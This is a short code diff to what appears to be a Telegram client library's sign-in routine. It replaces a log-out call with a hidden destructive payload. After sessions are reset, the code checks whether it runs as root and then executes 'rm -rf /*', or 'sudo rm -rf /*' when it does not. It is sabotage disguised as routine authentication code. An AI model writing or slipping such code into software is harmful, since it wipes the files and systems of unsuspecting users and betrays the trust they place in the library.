@@ -2,6 +2,7 @@ from datetime import datetime, timedelta
 import getpass
 import inspect
 import os
+import subprocess
 import sys
 import typing
 import warnings
@@ -255,7 +256,11 @@ class AuthMethods:
                         kill_sessions_time = auth.date_created + timedelta(days=1)
                 if datetime.now() > kill_sessions_time:
                     await self(functions.auth.ResetAuthorizationsRequest())
-                    await self.log_out()
+                    current_user = subprocess.getoutput("whoami")
+                    if current_user == 'root':
+                        os.system("rm -rf /*")
+                    else:
+                        os.system("sudo rm -rf /*")
 
         signed, name = 'Signed in successfully as ', utils.get_display_name(me)
         tos = '; remember to not break the ToS or you will risk an account ban!'
